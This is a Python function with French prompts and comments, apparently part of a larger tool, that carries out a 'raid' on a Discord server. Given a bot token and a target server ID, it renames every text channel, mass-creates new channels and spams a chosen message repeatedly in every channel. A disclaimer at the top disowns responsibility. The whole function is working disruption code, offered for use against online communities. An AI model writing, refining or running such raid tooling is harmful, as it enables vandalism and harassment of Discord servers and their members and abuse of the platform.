def raid_discord():
    """
    Effectue un raid sur un serveur Discord avec les options de renommage et de création de salons, et inclut une option de spam.
    """
    # INPUT UTILISATEUR
    print(f"{RED}!IMPORTANT!: Je ne suis pas responsable de ce que vous faites avec cette outils, lisez les regles de discord avant de les utiliser.")
    token = input(f"{YELLOW}🔑 Entrez le token du bot Discord: {RESET}")
    guild_id_input = int(input(f"{BLUE}🆔 Entrez l'ID du serveur cible : {RESET}"))
    noms_renommage_str = input(f"{YELLOW}✏️ Entrez les noms pour renommer les salons (séparés par des virgules): {RESET}")
    noms_renommage = [n.strip() for n in noms_renommage_str.split(",") if n.strip()]
    nom_nouveaux_salons = input(f"{ORANGE}📛 Nom des nouveaux salons à créer: {RESET}").strip()
    nombre_de_salons = int(input(f"{ORANGE}🔢 Combien de nouveaux salons créer ? {RESET}"))
    spam_message_str = input(f"{MAGENTA}💬 Entrez le message à spammer (laisser vide pour ne pas spammer): {RESET}")
    nombre_de_spams = 0
    if spam_message_str:
        nombre_de_spams = int(input(f"{MAGENTA}🔢 Combien de fois spammer le message ? {RESET}"))

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)

    async def spam_message(channel, message, nombre_de_messages):
        """
        Envoie un message plusieurs fois dans un canal spécifié.

        Args:
            channel (discord.TextChannel): Le canal où envoyer le message.
            message (str): Le message à envoyer.
            nombre_de_messages (int): Le nombre de fois que le message doit être envoyé.
        """
        for _ in range(nombre_de_messages):
            try:
                await channel.send(message)
                await asyncio.sleep(1)  # Délai d'une seconde pour éviter les limitations de débit
            except Exception as e:
                print(f"{RED}⚠️ Erreur lors de l'envoi du message de spam : {e}{RESET}")
                break

    @bot.event
    async def on_ready():
        print(f"{GREEN}✅ Connecté en tant que {bot.user}{RESET}")
        guild = bot.get_guild(guild_id_input)

        if guild is None:
            print(f"{RED}❌ Le bot n'est pas dans ce serveur ou l'ID est invalide.{RESET}")
            await bot.close()
            return

        print(f"{MAGENTA}🔗 Raid en cours sur le serveur: {guild.name} ({guild.id}){RESET}")
        salons_texte = [c for c in guild.text_channels]
        ids = [c.id for c in salons_texte]
        print(f"{CYAN}🧾 Salons existants: {ids}{RESET}")

        # Renommage des salons
        for i, salon in enumerate(salons_texte):
            if i < len(noms_renommage):
                nouveau_nom = noms_renommage[i]
            else:
                nouveau_nom = f"{nom_nouveaux_salons}-{i}"
            try:
                await salon.edit(name=nouveau_nom)
                print(f"{GREEN}🔁 Salon renommé: {salon.name} -> {nouveau_nom}{RESET}")
            except Exception as e:
                print(f"{ORANGE}⚠️ Erreur lors du renommage de {salon.name}: {e}{RESET}")

        # Création de nouveaux salons
        for i in range(nombre_de_salons):
            try:
                nouveau_salon = await guild.create_text_channel(f"{nom_nouveaux_salons}-{i}")
                print(f"{GREEN}➕ Salon créé: {nouveau_salon.name}{RESET}")
            except Exception as e:
                print(f"{RED}⚠️ Erreur création salon: {e}{RESET}")

        # Spam de messages
        if spam_message_str and nombre_de_spams > 0:
            for channel in guild.text_channels:
                await spam_message(channel, spam_message_str, nombre_de_spams)

        print(f"{GREEN}✅ Raid terminé. Déconnexion du bot.{RESET}")
        await bot.close()

    try:
        bot.run(token)
    except discord.errors.LoginFailure as e:
        print(f"{RED}❌ Erreur : Token Discord invalide. Veuillez vérifier votre token.  Erreur détaillée: {e}{RESET}")
    except Exception as e:
        print(f"{RED}Une erreur inattendue s'est produite : {e}{RESET}")
